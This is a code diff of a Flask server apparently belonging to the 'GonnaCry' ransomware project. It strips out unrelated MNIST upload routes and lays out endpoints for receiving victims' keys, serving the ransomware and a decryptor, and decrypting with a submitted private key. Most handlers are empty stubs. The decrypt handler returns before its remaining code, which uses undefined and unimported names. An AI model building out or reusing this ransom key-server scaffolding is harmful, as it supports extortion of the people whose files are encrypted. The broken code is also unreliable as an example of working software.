@@ -1,4 +1,4 @@
-from flask import Flask, redirect, request
+from flask import Flask, redirect, request, Response
 from flask import render_template, url_for
 import os
 import time
@@ -16,63 +16,54 @@ app = Flask("gonnacry-web-server")
 
 @app.errorhandler(404)
 def page_not_found(error):
-	app.logger.error('Page not found: %s', (request.path))
-	return render_template('404.html'), 404
+	return Response("nothing to do here ...")
 
 @app.errorhandler(500)
 def page_not_found(error):
-	app.logger.error('Page not found: %s', (request.path))
-	return render_template('404.html'), 404
-
-def allowed_file(filename):
-    return '.' in filename and \
-           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+	return Response("Oops I screwed something ...")
 
 
 @app.route("/recive-keys/", methods=['POST'])
 def recive_keys():
     pass
 
-@app.route('/classification', methods=['GET'])
-def classification():
-    return render_template('classification.html')
 
 @app.route("/download-gonnacry/", methods=["GET"])
 def download_gonnacry():
     pass
 
+
 @app.route("/download-decryptor/", methods=["GET"])
 def download_decryptor():
     pass
 
+
 @app.route("/decrypt/", methods=['POST'])
 def decrypt():
-    pass
+    data = request.data.decode('UTF-8')
 
-@app.route('/mnist', methods=['GET', 'POST'])
-def mnist():
-    if request.method == 'GET':
-        return render_template('mnist.html')
+    try:
+        data = base64.b64decode(data)
+    except base64.binascii.Error:
+        return Response('Wrong format key. Expected: b64encoded private key!', status=415)
 
-    elif request.method == 'POST':
-        # if file not send
-        if 'file' not in request.files:
-            flash('No file part')
-            return redirect(url_for("mnist"), code=302)
-        
-        file = request.files['file']
-        # if user does not select file, browser also
-        # submit a empty part without filename
-        if file.filename == '':
-            flash('No selected file')
-            return redirect(request.url)
+    return Response(data, status=200)
+    
+    key = RSA.importKey(private_key)
+    cipher = PKCS1_OAEP.new(key)
+    try:
+        decrypted = ""
+        for i in enc:
+            ciphertext = cipher.decrypt(i)
+            decrypted += ciphertext
+    except:
+        return Response("Invalid private key!", status=400)
+    return Response(decrypted, status=200)
 
-        if file and allowed_file(file.filename):
-            filename = secure_filename(file.filename)
-            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-            return redirect(url_for('uploaded_file',
-                                    filename=filename))
 
+@app.route("/")
+def main():
+    return 'nothing here ... '
 
 if __name__ == '__main__':
 
